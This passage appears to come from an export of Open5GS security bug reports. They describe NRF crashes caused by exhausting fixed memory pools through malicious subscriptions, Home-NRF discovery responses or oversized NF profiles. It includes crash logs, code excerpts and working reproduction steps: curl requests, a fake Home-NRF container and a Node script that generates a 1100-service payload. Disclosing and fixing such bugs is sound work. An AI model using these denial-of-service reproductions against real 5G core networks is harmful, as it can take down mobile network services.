04/12 06:13:46.267: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
04/12 06:13:46.267: [nrf] FATAL: nrf_nnrf_handle_nf_status_subscribe: Assertion `client' failed. (../src/nrf/nnrf-handler.c:603)
04/12 06:13:46.267: [core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should reject excessive unique notification endpoints with a normal HTTP error such as `429`, `503`, or `507`, and remain running.

### Observed Behaviour

The `65`th valid subscription request with a fresh notification host exhausts `client_pool` and terminates the NRF process with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: NRF crash on inter-PLMN `NNRF_DISC` `SearchResult` by exhausting the NF instance pool

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when an inter-PLMN discovery request causes the local NRF to query a
Home-PLMN NRF and the Home-NRF `SearchResult` contains too many distinct
`nfInstances`.

This is a client-response trust-boundary bug, not a direct
`nnrf-nfm/nf-instances` registration bug. The local NRF enters the inter-PLMN
fallback path, sends a downstream discovery request to the Home NRF, and then
parses the returned `SearchResult` through:

```c
OpenAPI_list_for_each(SearchResult->nf_instances, node) {
    ...
    nf_instance = ogs_sbi_nf_instance_find(NFProfile->nf_instance_id);
    if (!nf_instance) {
        nf_instance = ogs_sbi_nf_instance_add();
        ogs_assert(nf_instance);
    }
}
```

`ogs_sbi_nf_instance_add()` allocates from a fixed `nf_instance_pool` and
asserts when the pool is exhausted:

```c
ogs_pool_alloc(&nf_instance_pool, &nf_instance);
ogs_assert(nf_instance);
```

Pool sizing comes from the peer limit:

```c
ogs_app()->pool.nf = global_conf.max.peer;
```

With default settings this is `64`. In a fresh NRF process, the pool already
contains the local NRF instance, and the inter-PLMN fallback path also adds a
temporary Home-NRF entry before parsing the response. A malicious Home-NRF
response with enough unique `nfInstances` therefore crashes the local NRF.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances` with inter-PLMN parameters
- Downstream client path:
  local NRF -> Home NRF `GET /nnrf-disc/v1/nf-instances`
- Response iteration site:
  `../src/nrf/nnrf-handler.c:1419-1449`
- Exact crash site:
  `../lib/sbi/context.c:1235-1236`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling field:
  `SearchResult.nfInstances[*].nfInstanceId`

### Steps to Reproduce

1. Run a fake h2c Home NRF on the Docker `open5gs` network:

```bash
docker rm -f hnrfctl 2>/dev/null || true
docker run -d --name hnrfctl --network open5gs --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:22-alpine node /srv/nrf_fake_hnrf.js
```

2. Resolve the current local NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

3. Control case: configure the helper to return one benign foreign NF and send
   an inter-PLMN discovery request:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 8 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'
```

4. Malicious case: switch the helper to `many-instances`, restart the local
   NRF to clear cached foreign NF entries, and send the same request again:

```bash
printf 'many-instances\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 20
```

### Logs

```shell
Control response:


HTTP/2 200
{"validityPeriod":30,"nfInstances":[{"nfInstanceId":"fake-foreign-udr-safe",...}]}


Malicious client-visible failure:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream


Container state after the crash:


exited 139 2026-04-12T06:24:40.452605766Z 0


NRF logs:


04/12 06:24:40.364: [nrf] INFO: [fake-foreign-udr-many-062] (NF-discover) NF registered [type:UDR] (../src/nrf/nnrf-handler.c:1460)
04/12 06:24:40.364: [sbi] FATAL: ogs_sbi_nf_instance_add: Assertion `nf_instance' failed. (../lib/sbi/context.c:1236)
04/12 06:24:40.364: [core] FATAL: backtrace() returned 11 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The local NRF should reject or cap oversized Home-NRF `SearchResult` collections without abortin

### Observed Behaviour

A single malicious Home-NRF discovery response with many distinct NF profiles terminates the local NRF process with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: NRF crash in `ogs_sbi_nf_service_add()` by exhausting the NF service pool

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

This merged report covers both currently confirmed reachability variants that
hit the same `nf_service_pool` exhaustion crash site.

The shared bug is in the NF-service allocation path:

```c
nf_service = ogs_sbi_nf_service_add(
                nf_instance,
                NFService->service_instance_id,
                NFService->service_name, NFService->scheme);
ogs_assert(nf_service);
```

`ogs_sbi_nf_service_add()` allocates from a fixed pool and asserts on failure:

```c
ogs_pool_alloc(&nf_service_pool, &nf_service);
ogs_assert(nf_service);
```

The default sizing is:

```c
ogs_app()->pool.nf = global_conf.max.peer;
ogs_app()->pool.nf_service = ogs_app()->pool.nf * 16;
```

With default settings that yields `1024` service objects across the entire NRF
process. The same exhaustion crash is reachable via:

1. Direct server-side registration:
   `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
2. Client-response inter-PLMN discovery:
   `GET /nnrf-disc/v1/nf-instances`, where a malicious Home NRF returns an
   oversized `SearchResult.nfInstances[*].nfServices` payload

### Root cause

- Shared crash site:
  `../lib/sbi/context.c:1476-1477`
- Root cause family:
  resource exhaustion leading to assertion abort
- Direct reachability:
  `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Client-response reachability:
  inter-PLMN `GET /nnrf-disc/v1/nf-instances`
- Controlling field:
  `NFProfile.nfServices`

### Direct Reproduction

1. Generate a small control profile and a large malicious profile:

```bash
node <<'NODE'
const fs = require('fs');

function svc(i) {
  return {
    serviceInstanceId: `svc-${String(i).padStart(4, '0')}`,
    serviceName: 'nnrf-nfm',
    versions: [{ apiVersionInUri: 'v1', apiFullVersion: '1.0.0' }],
    scheme: 'http',
    nfServiceStatus: 'REGISTERED'
  };
}

const control = {
  nfInstanceId: '11111111-1111-1111-1111-111111111111',
  nfType: 'AMF',
  nfStatus: 'REGISTERED',
  fqdn: 'instance-control.example.org',
  nfServices: Array.from({ length: 4 }, (_, i) => svc(i + 1))
};

const bomb = {
  nfInstanceId: '22222222-2222-2222-2222-222222222222',
  nfType: 'AMF',
  nfStatus: 'REGISTERED',
  fqdn: 'instance-bomb.example.org',
  nfServices: Array.from({ length: 1100 }, (_, i) => svc(i + 1))
};

fs.writeFileSync('/tmp/nrf-service-control.json', JSON.stringify(control));
fs.writeFileSync('/tmp/nrf-service-bomb.json', JSON.stringify(bomb));
NODE
```

2. Control case:

